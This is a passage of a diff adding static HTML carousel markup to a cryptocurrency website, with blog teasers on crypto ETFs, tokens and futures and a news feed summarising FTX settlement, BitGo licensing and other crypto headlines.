+                    <div class="slick-list" style="padding: 0px;">
+                      <div class="slick-track"
+                        style="width: 4212px; opacity: 1; transform: translate3d(-972px, 0px, 0px);">
+                        <div data-index="-4" tabindex="-1" class="slick-slide slick-center slick-cloned"
+                          aria-hidden="true" style="width: 324px;">
+                          <div>
+                            <div tabindex="-1" style="width: 100%; display: inline-block;">
+                              <div class="feed-item"><a class="interact-button feed-img w-100"
+                                  href="#"><img loading="lazy"
+                                    src="1.png" alt="crypto-etf-meaning" class="img-fluid blog-landing-img w-100"></a>
+                                <div class="feed-des"><a href="#"
+                                    style="text-decoration: none;">
+                                    <h3 class="news_head">What is a Crypto ETF? Understanding Crypto ETF Meaning</h3>
+                                  </a>
+                                  <p class="news_para">Cryptocurrency exchange-traded fund (ETF) is an investment
+                                    vehicle that tracks the price performance of one or more cryptocurrencies to provide
+                                    exposure to the underlying asset.
+                                    They are traded on standard stock exchanges, and investors can hold them in their
+                                    regular brokerage accounts.</p>
+                                  <p class="d-flex flex-column mb-0"><span><a
+                                        href="#">Read more</a>
+                                    </span></p>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div data-index="-3" tabindex="-1" class="slick-slide slick-cloned" aria-hidden="true"
+                          style="width: 324px;">
+                          <div>
+                            <div tabindex="-1" style="width: 100%; display: inline-block;">
+                              <div class="feed-item"><a class="feed-img w-100"
+                                  href="#"><img
+                                    loading="lazy" src="2.png" alt="what-are-tokens-in-cryptocurrency"
+                                    class="img-fluid blog-landing-img w-100"></a>
+                                <div class="feed-des"><a
+                                    href="#"
+                                    style="text-decoration: none;">
+                                    <h3 class="news_head">What Are Tokens in Cryptocurrency? A Detailed Guide</h3>
+                                  </a>
+                                  <p class="news_para">You may have heard of the term 'token' in blockchain technology
+                                    and cryptocurrency investment discussions. These digital representations of value
+                                    are not just confined to cryptocurrency; they are revolutionizing industries from
+                                    art and real estate to supply chain management and decentralized finance (DeFi).</p>
+                                  <p class="d-flex flex-column mb-0"><span><a
+                                        href="#">Read
+                                        more</a> </span></p>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div data-index="-2" tabindex="-1" class="slick-slide slick-active slick-cloned"
+                          aria-hidden="false" style="width: 324px;">
+                          <div>
+                            <div tabindex="-1" style="width: 100%; display: inline-block;">
+                              <div class="feed-item"><a class="interact-button feed-img w-100"
+                                  href="#k"><img
+                                    loading="lazy" src="3.png" alt="how-does-tokenization-work"
+                                    class="img-fluid blog-landing-img w-100"></a>
+                                <div class="feed-des"><a
+                                    href="#"
+                                    style="text-decoration: none;">
+                                    <h3 class="news_head">Understanding Tokenization: How Does Tokenization Work?</h3>
+                                  </a>
+                                  <p class="news_para">When it comes to digital asset management, one key concept you
+                                    must take into account is Tokenization, and how does Tokenization works. This
+                                    groundbreaking idea, gaining momentum, is reworking how investors access stock, real
+                                    estate, and other assets.</p>
+                                  <p class="d-flex flex-column mb-0"><span><a
+                                        href="#">Read
+                                        more</a> </span></p>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div data-index="-1" tabindex="-1" class="slick-slide slick-active slick-cloned"
+                          aria-hidden="false" style="width: 324px;">
+                          <div>
+                            <div tabindex="-1" style="width: 100%; display: inline-block;">
+                              <div class="feed-item"><a class="feed-img w-100"
+                                  href="#"><img
+                                    loading="lazy" src="4.png" alt="how-to-trade-crypto-futures-in-us"
+                                    class="img-fluid blog-landing-img w-100"></a>
+                                <div class="feed-des"><a
+                                    href="#"
+                                    style="text-decoration: none;">
+                                    <h3 class="news_head">How to Trade Crypto Futures in the US: A Beginner’s Guide</h3>
+                                  </a>
+                                  <p class="news_para">With the popularity of cryptocurrencies, interest in trading in
+                                    crypto futures has spurred. These contracts allow traders to speculate on the future
+                                    price of a cryptocurrency without actually purchasing it.
+                                    This means you can bet on the price trajectory of an underlying asset such as
+                                    Bitcoin without owning any.</p>
+                                  <p class="d-flex flex-column mb-0"><span><a
+                                        href="#">Read
+                                        more</a> </span></p>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div data-index="0" class="slick-slide slick-active slick-center slick-current" tabindex="-1"
+                          aria-hidden="false" style="outline: none; width: 324px;">
+                          <div>
+                            <div tabindex="-1" style="width: 100%; display: inline-block;">
+                              <div class="feed-item"><a class="feed-img w-100"
+                                  href="#"><img loading="lazy"
+                                    src="1.png" alt="crypto-etf-meaning" class="img-fluid blog-landing-img w-100"></a>
+                                <div class="feed-des"><a href="#"
+                                    style="text-decoration: none;">
+                                    <h3 class="news_head">What is a Crypto ETF? Understanding Crypto ETF Meaning</h3>
+                                  </a>
+                                  <p class="news_para">Cryptocurrency exchange-traded fund (ETF) is an investment
+                                    vehicle that tracks the price performance of one or more cryptocurrencies to provide
+                                    exposure to the underlying asset.
+                                    They are traded on standard stock exchanges, and investors can hold them in their
+                                    regular brokerage accounts.</p>
+                                  <p class="d-flex flex-column mb-0"><span><a
+                                        href="#">Read more</a>
+                                    </span></p>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div data-index="1" class="slick-slide slick-active" tabindex="-1" aria-hidden="false"
+                          style="outline: none; width: 324px;">
+                          <div>
+                            <div tabindex="-1" style="width: 100%; display: inline-block;">
+                              <div class="feed-item"><a class="feed-img w-100"
+                                  href="#"><img
+                                    loading="lazy" src="2.png" alt="what-are-tokens-in-cryptocurrency"
+                                    class="img-fluid blog-landing-img w-100"></a>
+                                <div class="feed-des"><a
+                                    href="#"
+                                    style="text-decoration: none;">
+                                    <h3 class="news_head">What Are Tokens in Cryptocurrency? A Detailed Guide</h3>
+                                  </a>
+                                  <p class="news_para">You may have heard of the term 'token' in blockchain technology
+                                    and cryptocurrency investment discussions. These digital representations of value
+                                    are not just confined to cryptocurrency; they are revolutionizing industries from
+                                    art and real estate to supply chain management and decentralized finance (DeFi).</p>
+                                  <p class="d-flex flex-column mb-0"><span><a
+                                        href="#">Read
+                                        more</a> </span></p>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div data-index="2" class="slick-slide slick-active" tabindex="-1" aria-hidden="false"
+                          style="outline: none; width: 324px;">
+                          <div>
+                            <div tabindex="-1" style="width: 100%; display: inline-block;">
+                              <div class="feed-item"><a class="feed-img w-100"
+                                  href="#"><img
+                                    loading="lazy" src="3.png" alt="how-does-tokenization-work"
+                                    class="img-fluid blog-landing-img w-100"></a>
+                                <div class="feed-des"><a
+                                    href="h#"
+                                    style="text-decoration: none;">
+                                    <h3 class="news_head">Understanding Tokenization: How Does Tokenization Work?</h3>
+                                  </a>
+                                  <p class="news_para">When it comes to digital asset management, one key concept you
+                                    must take into account is Tokenization, and how does Tokenization works. This
+                                    groundbreaking idea, gaining momentum, is reworking how investors access stock, real
+                                    estate, and other assets.</p>
+                                  <p class="d-flex flex-column mb-0"><span><a
+                                        href="h#">Read
+                                        more</a> </span></p>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div data-index="3" class="slick-slide" tabindex="-1" aria-hidden="true"
+                          style="outline: none; width: 324px;">
+                          <div>
+                            <div tabindex="-1" style="width: 100%; display: inline-block;">
+                              <div class="feed-item"><a class="feed-img w-100"
+                                  href="#"><img
+                                    loading="lazy" src="4.png" alt="how-to-trade-crypto-futures-in-us"
+                                    class="img-fluid blog-landing-img w-100"></a>
+                                <div class="feed-des"><a
+                                    href="#"
+                                    style="text-decoration: none;">
+                                    <h3 class="news_head">How to Trade Crypto Futures in the US: A Beginner’s Guide</h3>
+                                  </a>
+                                  <p class="news_para">With the popularity of cryptocurrencies, interest in trading in
+                                    crypto futures has spurred. These contracts allow traders to speculate on the future
+                                    price of a cryptocurrency without actually purchasing it.
+                                    This means you can bet on the price trajectory of an underlying asset such as
+                                    Bitcoin without owning any.</p>
+                                  <p class="d-flex flex-column mb-0"><span><a
+                                        href="#">Read
+                                        more</a> </span></p>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div data-index="4" tabindex="-1" class="slick-slide slick-center slick-cloned"
+                          aria-hidden="true" style="width: 324px;">
+                          <div>
+                            <div tabindex="-1" style="width: 100%; display: inline-block;">
+                              <div class="feed-item"><a class="feed-img w-100"
+                                  href="#"><img loading="lazy"
+                                    src="1.png" alt="crypto-etf-meaning" class="img-fluid blog-landing-img w-100"></a>
+                                <div class="feed-des"><a href="#"
+                                    style="text-decoration: none;">
+                                    <h3 class="news_head">What is a Crypto ETF? Understanding Crypto ETF Meaning</h3>
+                                  </a>
+                                  <p class="news_para">Cryptocurrency exchange-traded fund (ETF) is an investment
+                                    vehicle that tracks the price performance of one or more cryptocurrencies to provide
+                                    exposure to the underlying asset.
+                                    They are traded on standard stock exchanges, and investors can hold them in their
+                                    regular brokerage accounts.</p>
+                                  <p class="d-flex flex-column mb-0"><span><a
+                                        href="#">Read more</a>
+                                    </span></p>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div data-index="5" tabindex="-1" class="slick-slide slick-cloned" aria-hidden="true"
+                          style="width: 324px;">
+                          <div>
+                            <div tabindex="-1" style="width: 100%; display: inline-block;">
+                              <div class="feed-item"><a class="feed-img w-100"
+                                  href="#"><img
+                                    loading="lazy" src="2.png" alt="what-are-tokens-in-cryptocurrency"
+                                    class="img-fluid blog-landing-img w-100"></a>
+                                <div class="feed-des"><a
+                                    href="#"
+                                    style="text-decoration: none;">
+                                    <h3 class="news_head">What Are Tokens in Cryptocurrency? A Detailed Guide</h3>
+                                  </a>
+                                  <p class="news_para">You may have heard of the term 'token' in blockchain technology
+                                    and cryptocurrency investment discussions. These digital representations of value
+                                    are not just confined to cryptocurrency; they are revolutionizing industries from
+                                    art and real estate to supply chain management and decentralized finance (DeFi).</p>
+                                  <p class="d-flex flex-column mb-0"><span><a
+                                        href="#">Read
+                                        more</a> </span></p>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div data-index="6" tabindex="-1" class="slick-slide slick-cloned" aria-hidden="true"
+                          style="width: 324px;">
+                          <div>
+                            <div tabindex="-1" style="width: 100%; display: inline-block;">
+                              <div class="feed-item"><a class="feed-img w-100"
+                                  href="h#"><img
+                                    loading="lazy" src="3.png" alt="how-does-tokenization-work"
+                                    class="img-fluid blog-landing-img w-100"></a>
+                                <div class="feed-des"><a
+                                    href="h#"
+                                    style="text-decoration: none;">
+                                    <h3 class="news_head">Understanding Tokenization: How Does Tokenization Work?</h3>
+                                  </a>
+                                  <p class="news_para">When it comes to digital asset management, one key concept you
+                                    must take into account is Tokenization, and how does Tokenization works. This
+                                    groundbreaking idea, gaining momentum, is reworking how investors access stock, real
+                                    estate, and other assets.</p>
+                                  <p class="d-flex flex-column mb-0"><span><a
+                                        href="h#">Read
+                                        more</a> </span></p>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div data-index="7" tabindex="-1" class="slick-slide slick-cloned" aria-hidden="true"
+                          style="width: 324px;">
+                          <div>
+                            <div tabindex="-1" style="width: 100%; display: inline-block;">
+                              <div class="feed-item"><a class="feed-img w-100"
+                                  href="#"><img
+                                    loading="lazy" src="4.png" alt="how-to-trade-crypto-futures-in-us"
+                                    class="img-fluid blog-landing-img w-100"></a>
+                                <div class="feed-des"><a
+                                    href="#"
+                                    style="text-decoration: none;">
+                                    <h3 class="news_head">How to Trade Crypto Futures in the US: A Beginner’s Guide</h3>
+                                  </a>
+                                  <p class="news_para">With the popularity of cryptocurrencies, interest in trading in
+                                    crypto futures has spurred. These contracts allow traders to speculate on the future
+                                    price of a cryptocurrency without actually purchasing it.
+                                    This means you can bet on the price trajectory of an underlying asset such as
+                                    Bitcoin without owning any.</p>
+                                  <p class="d-flex flex-column mb-0"><span><a
+                                        href="#">Read
+                                        more</a> </span></p>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+        <section class="feed-section">
+          <div class="container">
+            <div class="feed-content">
+              <div class="heading">
+                <h2 class="title text-center">ETF News Feed</h2>
+              </div>
+              <div class="feed-details">
+                <div class="news-slider">
+                  <div class="slick-slider slick-initialized" dir="ltr">
+                    <div class="slick-arrow slick-prev"><img fetchpriority="high" src="Group185.png" alt="Right"></div>
+                    <div class="slick-list" style="padding: 0px;">
+                      <div class="slick-track"
+                        style="width: 8100px; opacity: 1; transform: translate3d(-2592px, 0px, 0px);">
+                        <div data-index="-5" tabindex="-1" class="slick-slide slick-center slick-cloned"
+                          aria-hidden="true" style="width: 324px;">
+                          <div>
+                            <div tabindex="-1" style="width: 100%; display: inline-block;">
+                              <div class="feed-item">
+                                <div class="feed-img"><img loading="lazy" src="gen20-506389-536690.jpg" alt="News image"
+                                    class="img-fluid"></div>
+                                <div class="feed-des">
+                                  <h3 class="news_head">FTX, Alameda Ordered to Pay $12.7B to Creditors by U.S. Judge
+                                  </h3>
+                                  <p class="news_para">United States District Judge Peter Castel passed the approval on
+                                    August 7, a filing shows. It did not seek a civil monetary penalty.</p>
+                                  <p class="d-flex flex-column mb-0"><span>4 months ago <a
+                                        href="#"
+                                        target="_blank">Read more</a> </span></p>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div data-index="-4" tabindex="-1" class="slick-slide slick-cloned" aria-hidden="true"
+                          style="width: 324px;">
+                          <div>
+                            <div tabindex="-1" style="width: 100%; display: inline-block;">
+                              <div class="feed-item">
+                                <div class="feed-img"><img loading="lazy" src="gen13-506535-536675.jpg" alt="News image"
+                                    class="img-fluid"></div>
+                                <div class="feed-des">
+                                  <h3 class="news_head">Bitstamp and Stripe Collaborate for EU Crypto Onramp</h3>
+                                  <p class="news_para">Crypto exchange Bitstamp is collaborating with Stripe, a
+                                    financial infrastructure platform, to support Stripe's fiat-to-crypto onramp across
+                                    the EU. This collaboration enables EU consumers to easily purchase cryptocurrencies
+                                    through a customizable widget that developers can embed in apps or websites. This
+                                    widget offers a seamless checkout experience optimized for cryptocurrency conversion
+                                    and instant settlement.</p>
+                                  <p class="d-flex flex-column mb-0"><span>4 months ago <a
+                                        href="#"
+                                        target="_blank">Read more</a> </span></p>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div data-index="-3" tabindex="-1" class="slick-slide slick-cloned" aria-hidden="true"
+                          style="width: 324px;">
+                          <div>
+                            <div tabindex="-1" style="width: 100%; display: inline-block;">
+                              <div class="feed-item">
+                                <div class="feed-img"><img loading="lazy" src="gen3-506626-536639.jpg" alt="News image"
+                                    class="img-fluid"></div>
+                                <div class="feed-des">
+                                  <h3 class="news_head">New York judge nods $12.7B settlement between FTX, Alameda and
+                                    CFTC</h3>
+                                  <p class="news_para">United States District Judge Peter Castel has officially signed
+                                    off on a settlement between FTX and the commodities regulator, meaning $12.7 billion
+                                    will be paid back to FTX creditors.</p>
+                                  <p class="d-flex flex-column mb-0"><span>4 months ago <a
+                                        href="#"
+                                        target="_blank">Read more</a> </span></p>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div data-index="-2" tabindex="-1" class="slick-slide slick-cloned" aria-hidden="true"
+                          style="width: 324px;">
+                          <div>
+                            <div tabindex="-1" style="width: 100%; display: inline-block;">
+                              <div class="feed-item">
+                                <div class="feed-img"><img loading="lazy" src="gen6-506603-536684.jpg" alt="News image"
+                                    class="img-fluid"></div>
+                                <div class="feed-des">
+                                  <h3 class="news_head">NY judge approves $12.7B settlement between FTX, Alameda and
+                                    CFTC</h3>
+                                  <p class="news_para">United States District Judge Peter Castel has officially signed
+                                    off on a settlement between FTX and the commodities regulator, meaning $12.7 billion
+                                    will be paid back to FTX creditors.</p>
+                                  <p class="d-flex flex-column mb-0"><span>4 months ago <a
+                                        href="#"
+                                        target="_blank">Read more</a> </span></p>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div data-index="-1" tabindex="-1" class="slick-slide slick-cloned" aria-hidden="true"
+                          style="width: 324px;">
+                          <div>
+                            <div tabindex="-1" style="width: 100%; display: inline-block;">
+                              <div class="feed-item">
+                                <div class="feed-img"><img loading="lazy" src="crypto43-536910.jpg" alt="News image"
+                                    class="img-fluid"></div>
+                                <div class="feed-des">
+                                  <h3 class="news_head">Zimbabwe to Unveil De-Dollarization Roadmap, Says Government
+                                    Official</h3>
+                                  <p class="news_para">The Zimbabwean Cabinet has approved a de-dollarization roadmap
+                                    outlining “modalities to operationalize the Zig currency as legal tender for use in
+                                    the economy.” Zimbabwean officials have set early 2026 as the new deadline for
+                                    making the Zig the country's sole currency.</p>
+                                  <p class="d-flex flex-column mb-0"><span>4 months ago <a
+                                        href="#"
+                                        target="_blank">Read more</a> </span></p>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div data-index="0" class="slick-slide" tabindex="-1" aria-hidden="true"
+                          style="outline: none; width: 324px;">
+                          <div>
+                            <div tabindex="-1" style="width: 100%; display: inline-block;">
+                              <div class="feed-item">
+                                <div class="feed-img"><img loading="lazy" src="gen15-506526-536929.jpg" alt="News image"
+                                    class="img-fluid"></div>
+                                <div class="feed-des">
+                                  <h3 class="news_head">US crypto firm BitGo wins payment license in Singapore</h3>
+                                  <p class="news_para">Before receiving the license, BitGo served users in Singapore and
+                                    APAC, but the offering included only custody services from the US South Dakota Trust
+                                    and hot wallets.</p>
+                                  <p class="d-flex flex-column mb-0"><span>4 months ago <a
+                                        href=#"
+                                        target="_blank">Read more</a> </span></p>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div data-index="1" class="slick-slide" tabindex="-1" aria-hidden="true"
+                          style="outline: none; width: 324px;">
+                          <div>
+                            <div tabindex="-1" style="width: 100%; display: inline-block;">
+                              <div class="feed-item">
+                                <div class="feed-img"><img loading="lazy" src="donald-trump-crypto-536911.webp"
+                                    alt="News image" class="img-fluid"></div>
+                                <div class="feed-des">
+                                  <h3 class="news_head">Donald Trump Calls Press Conference, ‘Huge' Crypto Announcement?
+                                  </h3>
+                                  <p class="news_para">Former President Donald Trump announced plans to hold a press
+                                    conference on Thursday, August 8, at his Mar-a-Lago estate. This announcement drew
+                                    widespread attention due to recent developments both in the political and crypto
+                                    regulatory space.</p>
+                                  <p class="d-flex flex-column mb-0"><span>4 months ago <a
+                                        href="#"
+                                        target="_blank">Read more</a> </span></p>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div data-index="2" class="slick-slide" tabindex="-1" aria-hidden="true"
+                          style="outline: none; width: 324px;">
+                          <div>
+                            <div tabindex="-1" style="width: 100%; display: inline-block;">
+                              <div class="feed-item">
+                                <div class="feed-img"><img loading="lazy" src="crypto7-536917.jpg" alt="News image"
+                                    class="img-fluid"></div>
+                                <div class="feed-des">
+                                  <h3 class="news_head">Japan's Top Regulator Says Crypto-ETF Approvals Need 'Cautious
+                                    Consideration:' Report</h3>
+                                  <p class="news_para">The boss of Japan's Financial Services Agency (FSA) has said
+                                    “cautious consideration” needs to be given to the decision of approving
+                                    crypto-related exchange-traded funds.</p>
+                                  <p class="d-flex flex-column mb-0"><span>4 months ago <a
+                                        href="#"
+                                        target="_blank">Read more</a> </span></p>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div data-index="3" class="slick-slide slick-active" tabindex="-1" aria-hidden="false"
+                          style="outline: none; width: 324px;">
+                          <div>
+                            <div tabindex="-1" style="width: 100%; display: inline-block;">
+                              <div class="feed-item">
+                                <div class="feed-img"><img loading="lazy" src="gen12-506553-536778.jpg" alt="News image"
+                                    class="img-fluid"></div>
+                                <div class="feed-des">
+                                  <h3 class="news_head">Bitgo Secures Major Payment Institution License in Singapore
+                                  </h3>
+                                  <p class="news_para">Bitgo, a provider of digital asset solutions, has obtained the
+                                    Major Payment Institution License from the Monetary Authority of Singapore (MAS).
+                                    This follows an in-principle approval received several months ago. With this
+                                    license, Bitgo can now offer regulated digital payment token services in Singapore,
+                                    including secure custody and trading solutions.</p>
+                                  <p class="d-flex flex-column mb-0"><span>4 months ago <a
+                                        href="#"
+                                        target="_blank">Read more</a> </span></p>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div data-index="4" class="slick-slide slick-active" tabindex="-1" aria-hidden="false"
+                          style="outline: none; width: 324px;">
+                          <div>
+                            <div tabindex="-1" style="width: 100%; display: inline-block;">
+                              <div class="feed-item">
+                                <div class="feed-img"><img loading="lazy" src="gen19-506420-536696.jpg" alt="News image"
+                                    class="img-fluid"></div>
+                                <div class="feed-des">
+                                  <h3 class="news_head">Trump Sons Hints at Major Crypto Announcement Around DeFi</h3>
+                                  <p class="news_para">The crypto world is speculating about possible developments from
+                                    Donald Trump's sons after enigmatic posts on X.</p>
+                                  <p class="d-flex flex-column mb-0"><span>4 months ago <a
+                                        href="#"
+                                        target="_blank">Read more</a> </span></p>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div data-index="5" class="slick-slide slick-active slick-center slick-current" tabindex="-1"
+                          aria-hidden="false" style="outline: none; width: 324px;">
+                          <div>
+                            <div tabindex="-1" style="width: 100%; display: inline-block;">
+                              <div class="feed-item">
+                                <div class="feed-img"><img loading="lazy" src="gen20-506389-536690.jpg" alt="News image"
+                                    class="img-fluid"></div>
+                                <div class="feed-des">
+                                  <h3 class="news_head">FTX, Alameda Ordered to Pay $12.7B to Creditors by U.S. Judge
+                                  </h3>
+                                  <p class="news_para">United States District Judge Peter Castel passed the approval on
+                                    August 7, a filing shows. It did not seek a civil monetary penalty.</p>
+                                  <p class="d-flex flex-column mb-0"><span>4 months ago <a
+                                        href="#"
+                                        target="_blank">Read more</a> </span></p>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div data-index="6" class="slick-slide slick-active" tabindex="-1" aria-hidden="false"
+                          style="outline: none; width: 324px;">
+                          <div>
+                            <div tabindex="-1" style="width: 100%; display: inline-block;">
+                              <div class="feed-item">
+                                <div class="feed-img"><img loading="lazy" src="gen13-506535-536675.jpg" alt="News image"
+                                    class="img-fluid"></div>
+                                <div class="feed-des">
+                                  <h3 class="news_head">Bitstamp and Stripe Collaborate for EU Crypto Onramp</h3>
+                                  <p class="news_para">Crypto exchange Bitstamp is collaborating with Stripe, a
+                                    financial infrastructure platform, to support Stripe's fiat-to-crypto onramp across
+                                    the EU. This collaboration enables EU consumers to easily purchase cryptocurrencies
+                                    through a customizable widget that developers can embed in apps or websites. This
+                                    widget offers a seamless checkout experience optimized for cryptocurrency conversion
+                                    and instant settlement.</p>
+                                  <p class="d-flex flex-column mb-0"><span>4 months ago <a
+                                        href="#"
+                                        target="_blank">Read more</a> </span></p>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div data-index="7" class="slick-slide slick-active" tabindex="-1" aria-hidden="false"
+                          style="outline: none; width: 324px;">
+                          <div>
+                            <div tabindex="-1" style="width: 100%; display: inline-block;">
+                              <div class="feed-item">
+                                <div class="feed-img"><img loading="lazy" src="gen3-506626-536639.jpg" alt="News image"
+                                    class="img-fluid"></div>
+                                <div class="feed-des">
+                                  <h3 class="news_head">New York judge nods $12.7B settlement between FTX, Alameda and
+                                    CFTC</h3>
+                                  <p class="news_para">United States District Judge Peter Castel has officially signed
+                                    off on a settlement between FTX and the commodities regulator, meaning $12.7 billion
+                                    will be paid back to FTX creditors.</p>
+                                  <p class="d-flex flex-column mb-0"><span>4 months ago <a
+                                        href="#"
+                                        target="_blank">Read more</a> </span></p>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div data-index="8" class="slick-slide" tabindex="-1" aria-hidden="true"
+                          style="outline: none; width: 324px;">
+                          <div>
+                            <div tabindex="-1" style="width: 100%; display: inline-block;">
+                              <div class="feed-item">
+                                <div class="feed-img"><img loading="lazy" src="gen6-506603-536684.jpg" alt="News image"
+                                    class="img-fluid"></div>
+                                <div class="feed-des">
+                                  <h3 class="news_head">NY judge approves $12.7B settlement between FTX, Alameda and
+                                    CFTC</h3>
+                                  <p class="news_para">United States District Judge Peter Castel has officially signed
+                                    off on a settlement between FTX and the commodities regulator, meaning $12.7 billion
+                                    will be paid back to FTX creditors.</p>
+                                  <p class="d-flex flex-column mb-0"><span>4 months ago <a
+                                        href="#"
+                                        target="_blank">Read more</a> </span></p>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div data-index="9" class="slick-slide" tabindex="-1" aria-hidden="true"
+                          style="outline: none; width: 324px;">
+                          <div>
+                            <div tabindex="-1" style="width: 100%; display: inline-block;">
+                              <div class="feed-item">
+                                <div class="feed-img"><img loading="lazy" src="crypto43-536910.jpg" alt="News image"
+                                    class="img-fluid"></div>
+                                <div class="feed-des">
+                                  <h3 class="news_head">Zimbabwe to Unveil De-Dollarization Roadmap, Says Government
+                                    Official</h3>
+                                  <p class="news_para">The Zimbabwean Cabinet has approved a de-dollarization roadmap
+                                    outlining “modalities to operationalize the Zig currency as legal tender for use in
+                                    the economy.” Zimbabwean officials have set early 2026 as the new deadline for
+                                    making the Zig the country's sole currency.</p>
+                                  <p class="d-flex flex-column mb-0"><span>4 months ago <a
+                                        href="#"
+                                        target="_blank">Read more</a> </span></p>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div data-index="10" tabindex="-1" class="slick-slide slick-cloned" aria-hidden="true"
+                          style="width: 324px;">
+                          <div>
+                            <div tabindex="-1" style="width: 100%; display: inline-block;">
+                              <div class="feed-item">
+                                <div class="feed-img"><img loading="lazy" src="gen15-506526-536929.jpg" alt="News image"
+                                    class="img-fluid"></div>
+                                <div class="feed-des">
+                                  <h3 class="news_head">US crypto firm BitGo wins payment license in Singapore</h3>
+                                  <p class="news_para">Before receiving the license, BitGo served users in Singapore and
+                                    APAC, but the offering included only custody services from the US South Dakota Trust
+                                    and hot wallets.</p>
+                                  <p class="d-flex flex-column mb-0"><span>4 months ago <a
+                                        href=#"
+                                        target="_blank">Read more</a> </span></p>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div data-index="11" tabindex="-1" class="slick-slide slick-cloned" aria-hidden="true"
+                          style="width: 324px;">
+                          <div>
+                            <div tabindex="-1" style="width: 100%; display: inline-block;">
+                              <div class="feed-item">
+                                <div class="feed-img"><img loading="lazy" src="donald-trump-crypto-536911.webp"
+                                    alt="News image" class="img-fluid"></div>
+                                <div class="feed-des">
+                                  <h3 class="news_head">Donald Trump Calls Press Conference, ‘Huge' Crypto Announcement?
+                                  </h3>
+                                  <p class="news_para">Former President Donald Trump announced plans to hold a press
+                                    conference on Thursday, August 8, at his Mar-a-Lago estate. This announcement drew
+                                    widespread attention due to recent developments both in the political and crypto
+                                    regulatory space.</p>
+                                  <p class="d-flex flex-column mb-0"><span>4 months ago <a
+                                        href="#"
+                                        target="_blank">Read more</a> </span></p>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div data-index="12" tabindex="-1" class="slick-slide slick-cloned" aria-hidden="true"
+                          style="width: 324px;">
+                          <div>
+                            <div tabindex="-1" style="width: 100%; display: inline-block;">
+                              <div class="feed-item">
+                                <div class="feed-img"><img loading="lazy" src="crypto7-536917.jpg" alt="News image"
+                                    class="img-fluid"></div>
+                                <div class="feed-des">
+                                  <h3 class="news_head">Japan's Top Regulator Says Crypto-ETF Approvals Need 'Cautious
+                                    Consideration:' Report</h3>
+                                  <p class="news_para">The boss of Japan's Financial Services Agency (FSA) has said
+                                    “cautious consideration” needs to be given to the decision of approving
+                                    crypto-related exchange-traded funds.</p>
+                                  <p class="d-flex flex-column mb-0"><span>4 months ago <a
+                                        href="#"
+                                        target="_blank">Read more</a> </span></p>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div data-index="13" tabindex="-1" class="slick-slide slick-cloned" aria-hidden="true"
+                          style="width: 324px;">
+                          <div>
+                            <div tabindex="-1" style="width: 100%; display: inline-block;">
+                              <div class="feed-item">
+                                <div class="feed-img"><img loading="lazy" src="gen12-506553-536778.jpg" alt="News image"
+                                    class="img-fluid"></div>
+                                <div class="feed-des">
+                                  <h3 class="news_head">Bitgo Secures Major Payment Institution License in Singapore
+                                  </h3>
+                                  <p class="news_para">Bitgo, a provider of digital asset solutions, has obtained the
+                                    Major Payment Institution License from the Monetary Authority of Singapore (MAS).
+                                    This follows an in-principle approval received several months ago. With this
+                                    license, Bitgo can now offer regulated digital payment token services in Singapore,
+                                    including secure custody and trading solutions.</p>
+                                  <p class="d-flex flex-column mb-0"><span>4 months ago <a
+                                        href="#"
+                                        target="_blank">Read more</a> </span></p>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div data-index="14" tabindex="-1" class="slick-slide slick-cloned" aria-hidden="true"
+                          style="width: 324px;">
+                          <div>
+                            <div tabindex="-1" style="width: 100%; display: inline-block;">
+                              <div class="feed-item">
+                                <div class="feed-img"><img loading="lazy" src="gen19-506420-536696.jpg" alt="News image"
+                                    class="img-fluid"></div>
+                                <div class="feed-des">
+                                  <h3 class="news_head">Trump Sons Hints at Major Crypto Announcement Around DeFi</h3>
+                                  <p class="news_para">The crypto world is speculating about possible developments from
+                                    Donald Trump's sons after enigmatic posts on X.</p>
+                                  <p class="d-flex flex-column mb-0"><span>4 months ago <a
+                                        href="#"
+                                        target="_blank">Read more</a> </span></p>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div data-index="15" tabindex="-1" class="slick-slide slick-center slick-cloned"
+                          aria-hidden="true" style="width: 324px;">
+                          <div>
+                            <div tabindex="-1" style="width: 100%; display: inline-block;">
+                              <div class="feed-item">
